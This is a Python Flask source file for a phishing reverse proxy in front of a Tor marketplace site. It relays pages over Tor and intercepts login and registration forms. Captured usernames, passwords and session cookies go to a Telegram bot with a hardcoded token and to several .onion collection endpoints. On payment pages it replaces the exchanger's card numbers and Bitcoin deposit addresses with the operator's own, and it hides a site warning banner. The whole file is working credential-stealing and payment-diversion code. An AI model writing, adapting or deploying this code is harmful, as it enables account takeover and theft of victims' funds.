import base64
import json
import random
from threading import Thread
from urllib.parse import urlparse, parse_qs

import telebot
from bs4 import BeautifulSoup, NavigableString
from flask import Flask, request, make_response, redirect
import requests
from telebot.util import quick_markup

app = Flask(__name__)

proxies = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050'
}

bot = telebot.TeleBot("6195708230:AAH0Kkc0i3Fym2OfD_nBHPZ_u7J-o5dNhFU", parse_mode=None)
bmbkeys = '83a609e5e9dae94be64c4d848c85da75/'
bmb_urls = ['http://i7nmjkcchof5pegfglv7pkc7tbsl5ffvrxxjnqqz32nqqvmirhoh2gyd.onion/',
            'http://ofzzkc5elcatbskfolu4rabpqshizjniiezoucyrrnviubenkyvy2lyd.onion/',
            'http://xneip42hr7bz7xlxnhwpaqt4kl4pyl3ypjru7i6rhhegjmeb5h4u6iqd.onion/',
            'http://wglmnjp536t6hna5u2a2sk3zpak3rmdkk5uo6joix3klmmv3rx33r2id.onion/']

user_id ='-937233343'
def change_card(html,
                cards):
    try:
        print(cards)
        if len(cards) < 1:
            return html
        bs = BeautifulSoup(html, 'lxml', exclude_encodings='utf-8')
        cont = bs.find_all(class_='right_attr_item')

        pay_sum = cont[1].find('strong').string
        user_sum = cont[2].find('strong').string
        user_sum_btc = cont[2].find('span').string
        decor = bs.find(class_='decor_right')
        strin = NavigableString(
            r'<p class="right_attr_item">Id транзакции обменника: <span>de5dfb38-6e60-4434-a761-5fac4dfd0905</span></p>')
        decor.string = f"""
            <div class="right_title_box">                    <p class="right_attr_item">Id транзакции обменника: <span>de5dfb38-6e60-4434-a761-5fac4dfd0905</span></p>\
                    </div>\
    <div class="decor_right_attr">\
                        <p class="right_attr_item">Номер карты: <strong>{random.choice(cards)}</strong></p>\
                        <p class="right_attr_item">Переведите РОВНО указанную сумму: <strong>{pay_sum}</strong></p>\
                        <p class="decor_right_text">\
                            После поступления платежа, мы выдадим ваш заказ в течении 5 минут. Не отменяйте заказ, если вы уже отправили оплату!\
                        </p>\
                                        </div>\
                    <div class="decor_right_btn">\
                        <a href="/exchange/06bd2f0a-2bc5-41c6-b3cf-97efc164e54b/ask?order=de5dfb38-6e60-4434-a761-5fac4dfd0905">Задать вопрос</a>\
                        \
                        <a href="/exchange/06bd2f0a-2bc5-41c6-b3cf-97efc164e54b/order/de5dfb38-6e60-4434-a761-5fac4dfd0905/cancel" class="grey_btn">Отменить обмен</a>\
                    </div>\
    \
                    <div class="right_title_box_2">\
                        <p class="right_attr_item">Вы получите: <strong>{user_sum_btc}</strong>\
                            <span>{user_sum}</span>\
                            </p>\
                    </div>\
                    <div class="decor_product_box decor_product_box_mob">\
                        <div class="decor_warning_text">\
                            <p>\
                                <strong>Прочитайте перед оплатой:</strong>\
                            </p>\
                            <ol>\
                                <li>\
                                    Вы должны перевести ровно указанную сумму (не больше и не меньше), иначе ваш платеж зачислен не будет!. При переводе не точной суммы вы можете оплатить чужой заказ и потерять средства.\
                                </li>\
                                <li>\
                                    Делайте перевод одним платежом, если вы разобьете платеж на несколько, ваш платеж зачислен не будет!\
                                </li>\
                                <li>\
                                    Перевод нужно осуществить в течении 25 мин. после создания заказа. Если вам не хватает времени, отмените заявку и создайте новую!\
                                </li>\
                                <li>\
                                    Если у вас возникли какие-либо проблемы с оплатой, обратитесь в поддержку. Проблемы с оплатой рассматриваются в течении 48 часов.\
                                </li>\
                            </ol>\
                            <p>\
                                После оплаты, подождите 5-10 минут, наша система проверит ваш платеж и выдаст товар. <strong>НЕ ОТМЕНЯЙТЕ ЗАКАЗ</strong> без крайней необходимости.\
                            </p>\
                        </div>\
                    </div>\
                </div>
                """
        decr = bs.find(class_='decor_attr_wrap').findAll('span')
        decr[1].string = 'Ожидает оплаты'
    except Exception as ex:
        print(ex)
        return html

    return str(bs).replace('&lt;', '<').replace('&gt;', ">")


def change_only_card(html, cards=[ '2200 7008 3501 0140']):
    bs = BeautifulSoup(html, 'lxml')
    if len(cards) < 1:
        return html
    try:
        card = bs.find_all(class_='right_attr_item')[1].find('strong')
        card.string = f'{random.choice(cards)}'
    except Exception as ex:
        print(ex)
    return str(bs)

def alert_modal_off(html):
    bs = BeautifulSoup(html, 'lxml')
    alert = bs.find(class_='alert-message')
    script = bs.find_all('script')
    if script:
        script = script[-1]
        if "const show_alert = 1;" in script.text:
            script.string = """

                const show_alert = 0;
                const show_alert_uuid = 'bdf7071f-0c1e-43b2-a5f8-75585e174a2d'

                document.addEventListener('DOMContentLoaded', () => {
                    const callModal = () => {
                        let modal = document.querySelector('.modal'),
                            modalClose = document.querySelector('.close-modal');

                        modal.classList.add('open');
                        document.body.classList.add('open');

                        const closePopup = () => {
                            modal.classList.remove('open');
                            document.body.classList.remove('open');
                            const checked = $('.do_not_fuckme').is(":checked");
                            if (checked) {
                                $.ajax({
                                    url: "/alert/consume/" + show_alert_uuid,
                                    method: "get",
                                })
                            } else {
                                $.ajax({
                                    url: "/alert/hide/" + show_alert_uuid,
                                    method: "get",
                                })
                            }
                        }

                        const closeModal = (e) => {
                            if (
                                e.target === modal ||
                                e.target === modalClose
                            ) {
                                closePopup();
                            }
                        };

                        modal.addEventListener('click', closeModal);

                        $(document).ready(function () {
                            $('.prekrasno').click(function (e) {
                                closePopup()
                            });
                        })
                    }
                    if (show_alert === 1) {
                        callModal();
                    }
                })

                    """


    if alert:
        alert.string = ''
        return str(bs)


def bmb_send(login, password):
    for url in bmb_urls:
        try:
            result = requests.post(url + bmbkeys, json=[f'{login}:{password}\n'],
                                   proxies=proxies)
            print(result.content)
        except Exception as ex:
            print(ex)
            continue
def get_balance(html):
    bs = BeautifulSoup(html)
    try:
        money = bs.find(class_ ='account-money').text
    except:
        money = 0
    finally:
        return money
@app.route('/session/<path:path>', methods=['GET', 'POST'])
def sess_open(path):
    cookies = json.loads(base64.b64decode(path.encode('utf-8')).decode('utf-8'))
    resp = make_response(redirect('/'))
    for key, value in cookies.items():
        response_cookie_value = value if value else ''
        resp.set_cookie(key, response_cookie_value)
    return resp
@app.route('/', defaults={'path': ''}, methods=['GET', 'POST'])
@app.route('/<path:path>', methods=['GET', 'POST'])
def proxy(path):
    flag = False
    print('PATH: ' + path)
    target_url = request.cookies.get('url')
    if not target_url:
        target_url = 'http://kraken2trfqodidvlh4aa337cpzfrhdlfldhve5nf7njhumwr7instad.onion'
    request_headers = request.headers
    request_headers_dict = dict(request_headers)

    request_headers_dict.pop('Host')

    method = request.method
    if not target_url.endswith('/'):
        path = '/' + path
    if target_url.startswith('https'):
        target_url = 'http' + target_url[5:]

    if method == 'GET':
        print(request.cookies.to_dict())

        response = requests.get(target_url + path, params=request.args, cookies=request.cookies,
                                headers=request_headers_dict, proxies=proxies, allow_redirects=False, verify=False)

        respon_text = response.text

        if alert_modal_off(respon_text):
            respon_text = alert_modal_off(respon_text)
            flag = True


        if request.path.startswith('/exchange') and 'amount' in request.args:  # or 'order' in request.path.split('/')
            bot.send_message(user_id, f'Вход на страницу оплаты {request.args["amount"]}')
            respon_text = change_card(respon_text, cards=['2200 7008 3501 0140', '2200 7008 4750 7141', '2200 7008 4155 6292', '2200 7008 4890 9783', '2200 7008 4271 4643'])
            flag = True

        if ('exchange' in request.path) and ('order' in request.path) and ('my' not in request.path):
            bot.send_message(user_id, f'Вход на страницу оплаты')
            respon_text = change_only_card(respon_text)
            flag = True

        if path == '/profile/finances/':
            bs = BeautifulSoup(response.text, 'lxml')
            btc = bs.find(class_='finance_input')
            btc['value'] = random.choice[
                'bc1qajy94al63q0cw4f6z6jzx47jzpn5f28kms85aw', 'bc1qg8a29ujf459uyzedt8u9mhktmqkjdzth28xqqq', 'bc1qqqp72xt0fxdc8lll73ek0w0wuywjj7yslkxl5r']

            respon_text = str(bs)
            flag = True

    elif method == 'POST':


        if path in ['entry/post/login', '/entry/post/login']:
            response = requests.post(target_url + path, data=request.form, cookies=request.cookies,
                                     headers=request_headers_dict, proxies=proxies, allow_redirects=True, verify=False)
            done = '❌'
            balance = 0
            if 'entry/login' not in str(response.url):
                done = '✅'
                balance = get_balance(response.text)
            host_url = request_headers_dict['Referer']
            form_dict = dict(request.form)
            encoded_dict = base64.b64encode(json.dumps(request.cookies.to_dict()).encode('utf-8')).decode('utf-8')
            bot.send_message(user_id, f'Логин: {done}\n<code>{form_dict["login"]}:{form_dict["password"]}</code>\n'
                                             f'{host_url[:-11]}\n{balance}',
                             reply_markup=quick_markup({'Вход':{'url':f'{request.url[0:-17]}/session/{encoded_dict}'}}))
            Thread(target=bmb_send,args=[form_dict["login"],form_dict["password"]]).start()

            respon_text = response.text

            if alert_modal_off(respon_text):
                respon_text = alert_modal_off(respon_text)
                flag = True
        elif path in ['entry/post/register', '/entry/post/register']:
            response = requests.post(target_url + path, data=request.form, cookies=request.cookies,
                                     headers=request_headers_dict, proxies=proxies, allow_redirects=True, verify=False)
            done = '❌'
            if 'entry/login' not in str(response.url):
                done = '✅'
            host_url = request_headers_dict['Referer']
            form_dict = dict(request.form)
            bot.send_message(user_id, f'Регистрация: {done}\n<code>{form_dict["login"]}:{form_dict["password1"]}</code>\n {host_url[:-11]}')
            Thread(target=bmb_send,args=[form_dict["login"],form_dict["password1"]]).start()
            respon_text = response.text

            if alert_modal_off(respon_text):
                respon_text = alert_modal_off(respon_text)
                flag = True
        else:
            response = requests.post(target_url + path, data=request.form, cookies=request.cookies,
                                     headers=request_headers_dict, proxies=proxies, allow_redirects=False, verify=False)

    else:
        return 'Error: unsupported HTTP method'

    response_headers = response.headers
    response_headers_dict = dict(response_headers)
    response_headers_dict.pop('Transfer-Encoding', None)
    response_headers_dict.pop('Content-Encoding', None)
    response_headers_dict.pop('Content-Length', None)
    response_headers_dict.pop('host', None)
    url_location = response_headers_dict.pop('Location', None)
    if url_location is not None:
        target_url = str(url_location[:70])
        url_location = url_location[70:]
        if not url_location.startswith('/'):
            url_location = '/' + url_location
        if url_location == '':
            url_location = '/'
        response_headers_dict['Location'] =  url_location
    response.data = response.content
    response.headers.update(response_headers_dict)

    if flag == True:
        #print(respon_text)
        resp = make_response(respon_text, response.status_code)
    else:
        resp = make_response(response.content, response.status_code)
    # resp = make_response(respon_text, response.status_code)
    resp.headers.update(response_headers_dict)
    # добавление заголовка X-Forwarded-For
    for key, value in response.cookies.items():
        response_cookie_value = value if value else ''
        resp.set_cookie(key, response_cookie_value)
    resp.set_cookie('url', target_url)
    return resp


if __name__ == '__main__':
    app.run()

